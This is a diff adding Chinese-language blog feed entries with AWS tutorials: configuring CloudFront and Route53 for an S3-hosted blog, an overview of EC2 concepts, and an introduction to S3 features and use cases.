+<li><strong>Failover Routing Policy</strong>：该路由策略在其中一个被路由资源宕机的情况下会停止流量引入，从而避免用户访问到错误页面，这里涉及到Route53的另一个功能———健康检查。</li>
+<li><strong>Geolocation Routing Policy</strong>：地理位置策略允许用户设置将不同地理位置的用户流量导入到不同服务，例如希望悉尼的用户和北京的用户在一个网站上看到不同的页面，可以采用这种路由方式。</li>
+</ul>
+<h2 id="关于Cloudfront"><a href="#关于Cloudfront" class="headerlink" title="关于Cloudfront"></a>关于Cloudfront</h2><p>Cloudfront是AWS的CND服务，利用AWS分布在全球的节点服务器（Edge Location）缓存用户的访问，用户在第二次访问（或同区域的另一个用户在非首次访问）页面时会直接从节点服务器取到已经缓存的数据，速度会大大加快。<br>同理，Cloudfront也可以用于文件上传。</p>
+<h2 id="申请Route53和Cloudfront权限"><a href="#申请Route53和Cloudfront权限" class="headerlink" title="申请Route53和Cloudfront权限"></a>申请Route53和Cloudfront权限</h2><p>默认情况下，所有账户都是没有开启Cloudfront和Route53服务的，这个时候需要使用账号注册邮箱发送邮件到<a href="aws-verification@amazon.com">aws-verification@amazon.com</a>申请开通。</p>
+<h2 id="申请域名"><a href="#申请域名" class="headerlink" title="申请域名"></a>申请域名</h2><p>得到服务使用权限之后，还需要申请一个域名，这个时候可以在AWS的<a href="https://console.aws.amazon.com/cloudfront/route53" target="_blank" rel="external">Route53</a>进行购买，也可以在阿里云的<a href="https://wanwang.aliyun.com/domain/" target="_blank" rel="external">万网</a>注册一个域名，域名会按使用年数收费，不同域名收费不同。<br>在亚马逊购买域名，只需要进入<a href="https://console.aws.amazon.com/route53/home" target="_blank" rel="external">Console</a>，在<strong>Register Domain</strong>栏输入你想要的域名，点选Check，接下来如果域名可用，可以Add to Card然后付费即可。大约一小时后，这个域名就可以被使用了。</p>
+<p><img src="/images/Route53_Register_Domain.png" alt=""></p>
+<h2 id="配置Cloudfront"><a href="#配置Cloudfront" class="headerlink" title="配置Cloudfront"></a>配置Cloudfront</h2><p>点击<strong>Create Distribution</strong>按钮，Delivery method选择Web。 Web主要针对一些html，css,js等静态文件，而RTMP则主要是一些音视频文件。点选“Get Start”。</p>
+<p><img src="/images/Clouldfront_Configure_Select_Delivery_Method.png" alt=""></p>
+<p>下一步，要选择Origin,即要进行内容分发的源。虽然亚马逊会自动列出你的S3 bucket，但是千万不要选。而是自己手动输入example.com这个Bucket的Endpoint(Endpoint在S3 Console的Properties标签下的Static Website hosting里看得到)。为什么不直接选S3 bucket那?这是因为当我们访问一个目录时，我们期望能返回默认的object。虽然CouldFront有个Default Root Object设置，只是对根目录起作用，对子目录不起作用。如果使用Bucket的Endpoint，再加上之前已经给该Bucket配置了Default Object，就可以解决这个问题。</p>
+<p><img src="/images/Clouldfront_Configure_Origin_Domain_Name.png" alt=""></p>
+<p>选择将HTTP重定向到HTTPS，在CNAMEs项中输入自己的域名，多个域名以逗号分隔。<br>在Distribution Setting下选择你自己的证书(如果没有可以点选Request or Import a Certificate with ACM免费申请)。</p>
+<p><img src="/images/Clouldfront_Configure_Distribution_Setting.png" alt=""></p>
+<p>[可选]勾选Logging，并选择Bucket for Logs，可以打印访问信息。由于是静态网站，Cookie的Log就没有必要了。</p>
+<p><img src="/images/Clouldfront_Configure_Logging.png" alt=""></p>
+<p>点选<strong>Create Distribution</strong>，创建成功，需要等待大约半小时等待Status从<code>In progress</code>变为<code>Deployed</code>，在这期间可以配置Route53。</p>
+<p><img src="/images/Clouldfront_Configure_Success.png" alt=""></p>
+<p>配置成功后可以在管理员面板修改所有创建Distribution时设置的参数，并可以增加Error Page等设置。</p>
+<p><img src="/images/Clouldfront_Configure_Admin.png" alt=""></p>
+<blockquote>
+<ul>
+<li>注意：Cloudfront的配置每次更改都需要从新部署，每次重新部署都需要大约半小时时间，为了避免不必要的时间浪费，最好是一次配置成功，不然真的很痛苦。。</li>
+<li>另外，关于Cloudfront的日志，AWS不会针对日志功能进行收费，但用户需要对占用的S3 bucket存储和访问付费，日志内容大概和Nginx的access.log差不多，个人觉得AWS的<a href="https://console.aws.amazon.com/cloudfront/home#cache_stat_reports" target="_blank" rel="external">Reports &amp; Analytics</a>已经做得很好了，日志有些多余，建议可以在学习完后关闭。</li>
+</ul>
+</blockquote>
+<h3 id="关于缓存时间"><a href="#关于缓存时间" class="headerlink" title="关于缓存时间"></a>关于缓存时间</h3><p>关于S3里的Object在Cloudfront的各节点缓存的时间，默认为24小时，也就是说当我发布一篇新博客，由于主页index.html名字没有变化，只是更新了新版本，我要等到24小时后旧版本过期才能看到新的页面，这对我的小博客来说时间太长了，需要更改这个Cache时间，更改Cache时间有两种方式，一是更改TTL（Time To Live）时间，二是增加<code>Cache-Control: max-age=[seconds]</code>的heaeder，关于第二种方式，具体参见<a href="https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/Expiration.html#expiration-individual-objects" target="_blank" rel="external">官方文档</a>，这里我说一下如何更改TTL：<br>进入Distribution的管理员界面，选择<strong>Behaviors</strong>标签，勾选待编辑的Behavior，点选<strong>Edit</strong></p>
+<p><img src="/images/Cloudfront_Distributions_Behaviors.png" alt=""></p>
+<p>在Edit Behavior页面Object Caching项目勾选<strong>Customize</strong>自定义TTL，将Default TTL改为3600（1小时）点选<strong>Yes，Edit</strong>即可。<br>同样，更新配置要等待半小时左右方能生效。</p>
+<blockquote>
+<ul>
+<li>参见 <a href="https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/Expiration.html" target="_blank" rel="external">Specifying How Long Objects Stay in a CloudFront Edge Cache (Expiration)</a></li>
+</ul>
+</blockquote>
+<h4 id="首页缓存时间"><a href="#首页缓存时间" class="headerlink" title="首页缓存时间"></a>首页缓存时间</h4><p>更改TTL后，首页的更新也需要一个小时，对大部分情况来说这个时间还是比较长，这个时候可以通过更改S3的Bucket里面的Object的Metadata的方式增加<code>Cache-Control</code>的Header来进一步减少首页的Cache时间。</p>
+<p><img src="/images/Cloudfront_S3_Metadata.png" alt=""></p>
+<blockquote>
+<ul>
+<li>这个手动的设置会在每次Deploy的时候被覆盖，所以需要给Deploy插件增加Update Metadata/Header的设置。</li>
+</ul>
+</blockquote>
+<h3 id="如何清除缓存"><a href="#如何清除缓存" class="headerlink" title="如何清除缓存"></a>如何清除缓存</h3><h2 id="配置Route53"><a href="#配置Route53" class="headerlink" title="配置Route53"></a>配置Route53</h2><p>进入Route53的<a href="https://console.aws.amazon.com/route53/home" target="_blank" rel="external">Console</a>，进入<strong>Hosted Zones</strong>标签，点选使用的Domain Name。</p>
+<p><img src="/images/Route53_Host_Zones.png" alt=""></p>
+<p>点选<strong>Create Record Set</strong>，输入二级域名下的三级域名（可以置空），选择Type为A类地址，选择一个A-record），在AWS的内部资源中选择Cloudfront下对应你博客的域名，Route Policy为默认的Simple即可，点选<strong>Save Record Set</strong></p>
+<p><img src="/images/Route53_Create_Record_Set.png" alt=""></p>
+<p>只需要数分钟，A-record即可生效。</p>
+<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>现在可以通过HTTPS访问我在每个Edge Location缓存的博客了：</p>
+<p><a href="https://www.duyidong.com">https://www.duyidong.com</a></p>
+<p>经测试，同一个页面在加上Cloudfront之前（在S3 bucket中）访问时间是11秒，使用gitHub.io(带CDN)是6秒，使用Cloudfront之后加载时间大概是2.4秒，可见Cloudfront的加速效果是非常理想的。</p>
+<blockquote>
+<ul>
+<li>参考资料</li>
+<li><a href="https://www.huangbowen.net/blog/2013/10/01/migrate-octopress-to-aws-step-2/" target="_blank" rel="external">https://www.huangbowen.net/blog/2013/10/01/migrate-octopress-to-aws-step-2/</a></li>
+<li><a href="https://docs.aws.amazon.com/Route53/latest/DeveloperGuide/routing-policy.html" target="_blank" rel="external">https://docs.aws.amazon.com/Route53/latest/DeveloperGuide/routing-policy.html</a></li>
+<li><a href="https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/Expiration.html" target="_blank" rel="external">https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/Expiration.html</a></li>
+</ul>
+</blockquote>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;使用AWS解锁HTTPS和CDN&quot;&gt;&lt;a href=&quot;#使用AWS解锁HTTPS和CDN&quot; class=&quot;headerlink&quot; title=&quot;使用AWS解锁HTTPS和CDN&quot;&gt;&lt;/a&gt;使用AWS解锁HTTPS和CDN&lt;/h1&gt;&lt;p&gt;在上一篇博客中，笔者已经介绍
+    
+    </summary>
+    
+    
+      <category term="AWS" scheme="https://www.duyidong.com/tags/AWS/"/>
+    
+      <category term="Blog" scheme="https://www.duyidong.com/tags/Blog/"/>
+    
+      <category term="HTTPS" scheme="https://www.duyidong.com/tags/HTTPS/"/>
+    
+      <category term="CDN" scheme="https://www.duyidong.com/tags/CDN/"/>
+    
+      <category term="Cloudfront" scheme="https://www.duyidong.com/tags/Cloudfront/"/>
+    
+      <category term="Route53" scheme="https://www.duyidong.com/tags/Route53/"/>
+    
+      <category term="博客上云" scheme="https://www.duyidong.com/tags/%E5%8D%9A%E5%AE%A2%E4%B8%8A%E4%BA%91/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>AWS云上虚拟机</title>
+    <link href="https://www.duyidong.com/2017/03/15/AWS-EC2/"/>
+    <id>https://www.duyidong.com/2017/03/15/AWS-EC2/</id>
+    <published>2017-03-15T12:02:03.000Z</published>
+    <updated>2017-04-12T13:29:23.000Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="AWS虚拟机EC2"><a href="#AWS虚拟机EC2" class="headerlink" title="AWS虚拟机EC2"></a>AWS虚拟机EC2</h1><p>Amazon Elastic Cloud Compute，简单来说就是亚马逊的虚拟机。<br>亚马逊的EC2标榜有几大优势：完全控制，灵活使用，方便集成，安全，便宜，简单好用。<br>关于EC2有几个重要的概念：Instance Type，即在选择Instance的时候的内存，CUP等硬件指标；然后是EBS，即挂载硬盘，租户可以选择不同IO，不同介质的虚拟硬盘；其次是AMI，即用于启动虚拟机的操作系统镜像；另外还有Security Group，可以理解为虚拟机的防火墙；其他的服务都属于附加服务，比如负载均衡，弹性伸缩，监控报警，权限控制，类似nfs的弹性存储介质等等。<br>虚拟机服务是云服务最重要的服务，几乎各大云厂商最终要的一项都是对租户提供虚拟机，看大厂的虚拟机策略，其他各厂基本可通晓一二。<br>由于企业级应用很少用windows的使用场景，笔者将主要关注在Linux的使用上，本文对windows使用场景改不涉及。</p>
+<h2 id="Instances"><a href="#Instances" class="headerlink" title="Instances"></a>Instances</h2><p>EC2为亚马逊的服务，Instance就是该服务提供的一个实例 —— 虚拟机</p>
+<h3 id="Instance-Purchasing-Options"><a href="#Instance-Purchasing-Options" class="headerlink" title="Instance Purchasing Options"></a>Instance Purchasing Options</h3><p>在说Instance Type之前，有个更重要的东西：Instance的收费方式（Instance Purchasing Options）。Instance有四种收费方式，针对不同应用场景要学会选择适合的Purchasing Option:</p>
+<ul>
+<li><strong>On-Demand Instance</strong> 按小时收费，也是默认的收费方式，不足一小时按一小时计费；属于比较灵活的按需付费方式</li>
+<li><strong>Reserved Instances</strong> 预留实例，可选1-3年，一次付费，完成付费之后不管是否使用都会收费，价格相对按小时计费要便宜些，企业作为服务器长期使用通常会选择使用的付费方式</li>
+<li><strong>Scheduled Reserved Instances</strong> 计划预留实例，为期一年，在计划时间内可用。值得注意的是，只有几个高性能的Instance Type支持该购买方式，且每年使用不得少于1200小时，需提前三个月购买</li>
+<li><strong>Spot Instances</strong> 竞价实例，价格随时间浮动，租户在申请时出价，当租户出价高于该时间点竞价实例价格时，租户获得该实例使用权，当价格再次浮动导致实例价格高于租户出价，亚马逊会提前十分钟提醒租户，而后terminate实例，转移到别的地方。注意，被亚马逊销毁的实例最后一小时不收费，而用户在使用期间自行销毁的实例，不足一小时仍以一小时计费。这种收费方式适用于不需长期提供稳定服务的应用场景，比如大数据流处理。</li>
+<li><strong>Dedicated hosts</strong>买下一个跑在固定物理设备上的Instance的使用权，保证租户的licenses不会因为不同物理设备过期。</li>
+<li><strong>Dedicated Instances</strong>按小时计费的Dedicated hosts</li>
+</ul>
+<h3 id="Instances-Type"><a href="#Instances-Type" class="headerlink" title="Instances Type"></a>Instances Type</h3><p><a href="https://aws.amazon.com/ec2/instance-types/" target="_blank" rel="external">Instance Type</a>有10种类型，用于区分大致的应用场景，每个类型下有从nano, micro, small, medium, large, xlarge到16xlarge数目不等的型号，主要区分CPU数量，vCPU(亚马逊创造的用于衡量单个CPU运算能力的一个参数)，内存，不同，大小、类型不同，直接影响价格。</p>
+<p><img src="/images/AWS_Instances_Type.png" alt=""></p>
+<ul>
+<li>D2 - Dense storage Instance，特点是硬盘价格平衡，支持HDD硬盘，支持EC2 Enhanced Networking，适用于对存储需求比较高的场景，比如数据库，大数据存储</li>
+<li>R4: 特点是内存大</li>
+<li>M4: 各项平衡的一个Instance类型，也是默认情况下首选的Instance Type</li>
+<li>C4 - Compute Optimized: 计算能力优化，特点自然是计算速度快</li>
+<li>G2: 包含GPU的Instance，适合于图形计算，视频转码等场景</li>
+<li>I3 - High I/O Instance，高硬盘IO，使用固态硬盘，适用于非关系型数据库，大数据处理等</li>
+<li>F1 - 可以为程序定制硬件加速</li>
+<li>T2: 最常见的Instance使用类型，因为它最便宜，性能也最平衡，生产环境只适用于做web服务器，或小型数据库</li>
+<li>P2: 通用GPU计算机，常用于人工智能等需要大量计算的领域</li>
+<li><p>X1: CPU，内存都相当大，针对大规模，企业级，内存应用程序进行了优化，并且在Amazon EC2实例类型中具有每GiB最低的RAM价格</p>
+<p>Instance类型在创建后可以被更改，前提是Stop Instance</p>
+</li>
+</ul>
+<h3 id="Instance-LifeCycle"><a href="#Instance-LifeCycle" class="headerlink" title="Instance LifeCycle"></a>Instance LifeCycle</h3><p>Instance的生命周期，有pending, running, stop ,terminate几个主要的状态和动作，详见下图：</p>
+<p><img src="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/images/instance_lifecycle.png" alt=""></p>
+<h3 id="MetaData-amp-UserData"><a href="#MetaData-amp-UserData" class="headerlink" title="MetaData &amp; UserData"></a>MetaData &amp; UserData</h3><p>UserData是创建完成Instance最后一步用来准备Instance环境的Bash脚本，而MetaData是Instance与生俱来的元数据，通过<code>curl https://169.254.169.254/latest/meta-data/</code>这种奇特的方式获得，包含Instance类型，IP，public-key等信息。值得一提的是IAM的Role之所以在Instance的文件系统中不会出现Credential key的文件，是因为它把Credential key放到了MetaData中，可以通过获取MetaData的方式获得。</p>
+<h2 id="EBS"><a href="#EBS" class="headerlink" title="EBS"></a>EBS</h2><p>简单来讲，EBS(Elastic Block Storage)就是AWS为租户提供的虚拟硬盘，Instance可以看做主板，EBS可以被关联到任何一个Instance上，启动Instance时也必须要一个启动硬盘作为系统盘才能启动。这里就要区分一个重要的概念，EBS 和 Instance Store，两种类型的Instance，应该说EBS Instance比Instance Store 更健全一些，支持更多的Instance Type，生命周期完整；而Instance Store，是由存放在S3的文件系统启动的，启动速度慢，生命周期不完整，只能被Reboot或者Terminate，不能Stop，一旦启动失败就会丢失所有数据，且支持类型有限，被称为短暂存储（ephemeral Storage）<br>下面重点区分一下<a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSVolumeTypes.html" target="_blank" rel="external">EBS Volum Type</a>，与Instance相同，重点也在使用场景和节省开销：</p>
+<ul>
+<li>SSD, General Purporse - <strong>gp2</strong>: 兼顾性能与价格，吞吐量160MB/s，最大IOPS为10,000; 挂载卷大小在1GB-16TB；使用场景：推荐使用在大部分场景，虚拟机启动磁盘，提供低延迟的服务，可在开发测试环境应用</li>
+<li>SSD, Provisioned IOPS - <strong>io1</strong>: 高性能磁盘，吞吐量320MB/s，IOPS在10,000-20,000; 挂载卷大小在4GB-16TB；使用场景：执行紧急任务的应用模块，大数据库，比如MongDB, Orale, SQL Server等</li>
+<li>HDD, Throughput Optimized HDD - <strong>st1</strong>: 价格相对便宜的机械硬盘，用于存放不常使用的数据，IOPS最大仅500，吞吐量可达500MB/s，磁盘大小为500GB-16TB；使用场景：需要高吞吐量量有需要控制预算的场景，比如大数据，日志存放；不能用作启动磁盘</li>
+<li>HDD, Code HDD - <strong>sc1</strong>: 比普通机械硬盘更便宜的磁盘，IOPS仅为250，吞吐量250MB/s，容量500GB-16TB，使用场景：非常强调便宜的不常访问数据的存储</li>
+<li>HDD, EBS Magnetic - <strong>standard</strong>: 磁带存储，非常便宜的低频次访问的磁盘，性能最次（40-200IOPS, 40-60MB/s吞吐）</li>
+</ul>
+<blockquote>
+<p>注：以上参数均需在Instance类型的支持才能发挥到最大值，机械硬盘的优势在于高吞吐，固态硬盘的好处在于高IO；另外一个需要注意的是，你可以在一个Instance上绑定多个EBS，但是不能将一个EBS绑定在多个Instance上（这种情况要使用EFS）</p>
+</blockquote>
+<h2 id="Security-Group"><a href="#Security-Group" class="headerlink" title="Security Group"></a>Security Group</h2><p>Security Group可以理解为Instance的防火墙，在Instance的网络中大概处在以下位置：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/1765038-d1edcf22e1e4784c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p>SG的安全策略大范围分为Inbound和Outbound，顾名思义为控制进出，SG刚被创建时默认所有Inbound都是被禁止的，所有Outbound都是被允许的。<br>SG由数条规则（rules）构成，Rules有几个重要参数：目标地址（网段），协议类型，端口号。<br>关于SG有以下几个值得注意的点：</p>
+<ul>
+<li>SG策略在修改后立即生效</li>
+<li>一个SG可以被绑定到任意数量的Instance上</li>
+<li>一个Instance可以有多个SG，且被允许的Rules为多个SG的合</li>
+<li>SG是有状态的，也就是说当租户允许了一个请求进入，默认会打开到目的地址的返回请求</li>
+<li>通常情况我们不适用SG的Rules来组织IP访问，组织IP访问应该用ACL(Access Control List)</li>
+<li>SG只能添加允许访问的策略，不能添加禁止访问的策略</li>
+</ul>
+<h2 id="Volumse-amp-Snapshots"><a href="#Volumse-amp-Snapshots" class="headerlink" title="Volumse &amp; Snapshots"></a>Volumse &amp; Snapshots</h2><p>关于Volume Type，已经在EBS部分提到了，这里主要想讲的是磁盘的生命周期。<br>Volume可以从EBS创建，Attache到一个Instance上，再在操作系统中进行挂载，使其成为一个可用的文件系统，Volume可以随时扩容，但扩容后需要更新文件系统。<br>Volume可以凭空创建，也可以使用Snapshot创建，Snapshot就是磁盘的一个镜像，存放于S3中，用于定期备份磁盘。Snapshot是增量式的，也就是说只有被更改的部分会被记录在S3中。<br>第一个Snapshot的创建会比较花时间。<br>Snapshot可以通过S3在账户之间共享。<br>可以开启自动备份定时备份Volume。<br>EBS可以被加密，除了root Volume，租户可以使用第三方工具对启动磁盘进行加密。<br>另外说一下关于Windows卷扩容，需要停止磁盘读写，有以下措施可以做到：</p>
+<ul>
+<li>冻结文件系统</li>
+<li>卸载磁盘驱动（Unmount the RAID Array）</li>
+<li>关闭关联的EC2 Instance</li>
+</ul>
+<blockquote>
+<p>注：一个EBS可以被创建10,000个Snapshot，一个账户可以拥有的Volume存储大小总量单个类型不得超过20TB</p>
+</blockquote>
+<h2 id="AMI"><a href="#AMI" class="headerlink" title="AMI"></a>AMI</h2><p>既然有了Snapshot，另一个重要的概念就不得不提了，AMI，Amazon Machine Image，可以理解为虚拟机的启动镜像。一个AMI包含了在云上启动一个实例所需的所有信息，包括：</p>
+<ul>
+<li>一个Root Volume的模板（比如一个操作系统，一个应用）</li>
+<li>启动许可（在启动时用于判断该用户是否有从该AMI启动实例的权限）</li>
+<li>启动实例时需要挂载的磁盘映射表</li>
+</ul>
+<p>一个AMI的生命周期看起来像是这个样子的：</p>
+<p><img src="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/images/ami_lifecycle.png" alt=""></p>
+<p>AMI是划分Region的，租户可以通过Console或CLI在Region之间拷贝AMI。<br>AMI可以用于在<a href="https://aws.amazon.com/marketplace/search/results?x=0&amp;y=0&amp;searchTerms=&amp;page=1&amp;ref_=nav_search_box" target="_blank" rel="external">AWS Marketplace</a>出售。</p>
+<p>AMI依赖于Snapshot缺不被Instance依赖，这意味着租户不能删除一个被注册的AMI的Snapshot，却可以删除一个运行中实例的AMI，Snapshot，AMI，Instance的关系如下图:<br><img src="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/images/ami_delete_ebs.png" alt=""></p>
+<h2 id="ELB-amp-Health-Checks"><a href="#ELB-amp-Health-Checks" class="headerlink" title="ELB &amp; Health Checks"></a>ELB &amp; Health Checks</h2><p>ELB，Elastic LoadBalancer是构建一个高可用可用不得不谈的服务，经常和Autoscaling Group一起实现负载伸缩和高可用。<br>ELB是AWS提供的负载均衡器，用于将外部访问请求分发给状态健康的EC2 Instance。<br>ELB在创建的时候会有对外会有一个DNS解析域名，对所属Instance会做健康检查，所谓健康检查就是去定期访问一个文件，判断返回状态码为200即表明这个服务正常，Instance可以动态地被加载到ELB下，也可以动态移除，ELB会自动判断这个Instance已经失去连接并停止发送请求到这个Instance。<br>值得一提的是，ELB一个重要的功能是增加服务容灾性，通常会挂载多个不同AZ的Instance，做到一个数据中心挂掉仍然能够正常提供服务。</p>
+<h2 id="Cloud-Watch-EC2"><a href="#Cloud-Watch-EC2" class="headerlink" title="Cloud Watch EC2"></a>Cloud Watch EC2</h2><p>CloudWatch是AWS提供的EC2监控报警的服务，简单好用。<br>作为一款与AWS各种资源高度集成且简单好用的监控工具，CloudWatch有以下功能：</p>
+<ul>
+<li>构建Dashboard用于可视化云环境资源状况</li>
+<li>警告：配合SNS在某项指标超出一定阈值时发出邮件或短信通知</li>
+<li>事件：监控事件用于动态变更云设施</li>
+<li>日志：日志保存在S3中</li>
+</ul>
+<p>CloudWatch的一些类目默认情况是免费的，免费版本是5分钟取回一次数据，收费后变成1分钟一次，且部分metrics需要收费才能监控。默认监控的内容包括CPU，网络，硬盘IO等，但是没有内存。</p>
+<h2 id="Autoscaling-Group"><a href="#Autoscaling-Group" class="headerlink" title="Autoscaling Group"></a>Autoscaling Group</h2><p>一个Autoscaling Group包含多个特性相同的Instance，可以根据Instance的负载自动扩容或缩减，同时可以对Instance开启健康检查，如果一个Instance服务异常，Group会依照Lunch Configuration重新启动一个实例替换掉旧的实例。这种方式保证了Group内的Instance总是健康的，且Instance数目会根据负载情况进行动态伸缩。</p>
+<h2 id="Placement-Group"><a href="#Placement-Group" class="headerlink" title="Placement Group"></a>Placement Group</h2><p>Placement Group是一个在同AZ中的一组Instance，同PG的Instance可以享受到高带宽，低延迟的好处，但同时也有如下限制：</p>
+<ul>
+<li>一个Placement Group不能跨多个AZ</li>
+<li>一个Placement Group的名字必须在一个账号中是独一无二的</li>
+<li>Placement Group只支持一部分类型的Instance</li>
+<li>AWS推荐在一个PG中使用同质的Instance</li>
+<li>PG不能被合并</li>
+<li>租户不能移动一个已经存在的Instance到一个PG中，可以对这个Instance创建AMI，再使用这个AMI在PG中启动一个Instance</li>
+</ul>
+<h2 id="EFS"><a href="#EFS" class="headerlink" title="EFS"></a>EFS</h2><p>EFS是AWS提供可以再Instance之间贡献的一个NFS server，其最大的优点是不需要预先设置大小，其空间大小会随文件写入增多逐步扩容至PB级别，而租户只需按使用收费。<br>EFS可以支持上千个NFS4连接，适用于大数据存储，Web服务器静态文件共享，等诸多应用场景。<br>AWS目前有4个Region支持EFS，EFS的文件存放在多个AZ中，可以跨AZ共享文件。</p>
+<h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><ul>
+<li>每个账户默认被限制可以申请20个保留实例，增加上限需要给亚马逊提Request</li>
+<li>使用EC2发送邮件数量是有限制的</li>
+<li>每个账户最多可申请5个Elastic IP</li>
+<li>不同账户标记的一个AZ名字（比如us-east-1a）可能指向不同的物理数据中心</li>
+<li>要使用增强网络型实例（Enhanced Network）租户不需要另外付费，只需要选择适当的AMI和适当的Instance类型在一个VPC中即可</li>
+<li>默认情况下，当租户停止监控EC2实例或销毁了实例，两周内仍可访问CloudWatch的数据</li>
+<li>如果删掉一个Auto Scaling Group，其中的Instance会先被销毁</li>
+<li>租户可使用VM Import/Export从EC2导入/导出虚拟机镜像</li>
+<li>虽然Snapshot被存在S3中，但租户不能通过S3的API访问到Snapshot，而只能通过EC2的API访问</li>
+<li>分享Snapshot给特定的账户，Snapshot的状态仍为“private”</li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;AWS虚拟机EC2&quot;&gt;&lt;a href=&quot;#AWS虚拟机EC2&quot; class=&quot;headerlink&quot; title=&quot;AWS虚拟机EC2&quot;&gt;&lt;/a&gt;AWS虚拟机EC2&lt;/h1&gt;&lt;p&gt;Amazon Elastic Cloud Compute，简单来说就是亚马逊的虚拟机
+    
+    </summary>
+    
+    
+      <category term="AWS" scheme="https://www.duyidong.com/tags/AWS/"/>
+    
+      <category term="上云" scheme="https://www.duyidong.com/tags/%E4%B8%8A%E4%BA%91/"/>
+    
+      <category term="EC2" scheme="https://www.duyidong.com/tags/EC2/"/>
+    
+      <category term="云计算资源" scheme="https://www.duyidong.com/tags/%E4%BA%91%E8%AE%A1%E7%AE%97%E8%B5%84%E6%BA%90/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>AWS对象存储服务S3</title>
+    <link href="https://www.duyidong.com/2017/03/13/AWS-S3/"/>
+    <id>https://www.duyidong.com/2017/03/13/AWS-S3/</id>
+    <published>2017-03-13T01:45:12.000Z</published>
+    <updated>2017-04-12T13:28:09.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>AWS S3是一个非常厉害的服务，上个月S3宕机4小时，江湖上传出了“半个互联网出现问题”的传言。姑且不谈S3的影响力有多大，在计算单元越来越小且移动存储设备近两年并未降价的趋势下，高可用高伸缩的云存储服务应该成为每一个开发者必备的知识。<br>简单来说S3提供了一些bucket，租户可以在其中存放一些对象，何为对象？所有静态文件都属于镜像。<br>关于S3的高持久和高可用：</p>
+<p><img src="/images/Table_S3.png" alt=""></p>
+<h2 id="S3有几个重要的特点"><a href="#S3有几个重要的特点" class="headerlink" title="S3有几个重要的特点"></a>S3有几个重要的特点</h2><ul>
+<li><strong>Sunolicity:</strong>简单，S3服务可以使用AWS console控制，可以使用命令行，可以通过各种语言的sdk与各应用深度集成。</li>
+<li><strong>Drability:</strong>数据持久，S3(除了冗余备份服务)可以提供高达11个9的数据持久性，且提供跨Region备份，版本管理，充分保证数据持久性和容灾性（数据丢失可通过版本管理即使回滚）</li>
+<li><strong>Scalability:</strong>可扩展性，S3对租户的文件存储总量不做限制，租户可以存放需求相当的任何数量级的对象在S3上</li>
+<li><strong>Security:</strong>安全，AWS S3的文件传输都经过SSL加密，租户可以通过设置IAM管理对象访问权限，租户也可以选择在本地加密后上传S3，使用前再选择解密文件</li>
+<li><strong>Available:</strong>可用性，S3的Standard提供可用性达到99.99%的服务，IA(Infrequent Access)达到99.9%，RRS(Reduced Redundancy Storage)达到99.99%</li>
+<li><strong>Low Cost:</strong>低花费，这一点除了体现在S3按需收费上，还体现在S3的生存周期管理上，S3可以定期将久不访问的数据转移到IA服务上，在定期归档备份至Glacier中</li>
+<li><strong>Broad integration with other AWS services:</strong>与AWS其他服务广泛集成，包括安全（IAM, KMS），报警（CLoudWatch, CloudTrail &amp; Event Notifications），计算（Lambda），数据库（EMR, Redshift）</li>
+<li><strong>Enterprise-class Storage Management:</strong>企业级存储管理，S3允许租户采用<strong>数据驱动</strong>的方式提高存储优化，数据安全性和管理效率</li>
+</ul>
+<h2 id="S3的使用场景"><a href="#S3的使用场景" class="headerlink" title="S3的使用场景"></a>S3的使用场景</h2><h3 id="内容存储及分发"><a href="#内容存储及分发" class="headerlink" title="内容存储及分发"></a>内容存储及分发</h3><p>S3可以用以上传/下载文件，包括音频视频文件，比如构建一个提供给用户分享视频的网站，S3可以提供无限伸缩的空间，以及跨Region的备份，和定期的存储转移，充分保证网站可用性和高负载能力，另外还提供上传下载加密，以及访问请权限控制的功能。</p>
+<h3 id="数据分析存储"><a href="#数据分析存储" class="headerlink" title="数据分析存储"></a>数据分析存储</h3><p>S3可以用于存储用于数据分析的原始数据，因其很容易和EC2，Lambda等AWS的计算资源或事件触发器集成，可以轻松使用S3构建数据驱动的Data Pipeline，用于数据分析。且S3也可以用于存放数据分析产生的报告。</p>
+<h3 id="备份，存档以及灾难恢复"><a href="#备份，存档以及灾难恢复" class="headerlink" title="备份，存档以及灾难恢复"></a>备份，存档以及灾难恢复</h3><p>因为S3的版本管理和跨Region备份特特性，S3很适合作为备份，且可以定期将数据转归档存储到Glacier中，且易于恢复。</p>
+<h3 id="静态网站部署"><a href="#静态网站部署" class="headerlink" title="静态网站部署"></a>静态网站部署</h3><p>利用S3的高持久和4个9的可用性，可以将自己的静态网站部署到S3上，有以下几个好处：</p>
+<ul>
+<li>不用担心激增的访问量，S3可以处理激增的访问量，而不用改变网站架构</li>
+<li>S3是全球的，意味着你的网站可以在瞬间被部署到全球任意一个或多个节点</li>
+<li>S3是按使用付费的</li>
+</ul>
+<h2 id="S3的功能及特性"><a href="#S3的功能及特性" class="headerlink" title="S3的功能及特性"></a>S3的功能及特性</h2><p>S3有很多功能特性用于构建服务，这些服务都往往相互依存，了解服务功能固然重要，但结合使用场景才能凸显其价值。<br>参照：<a href="https://aws.amazon.com/s3/details/" target="_blank" rel="external">https://aws.amazon.com/s3/details/</a>和<a href="https://www.amazonaws.cn/en/s3/details/" target="_blank" rel="external">https://www.amazonaws.cn/en/s3/details/</a></p>
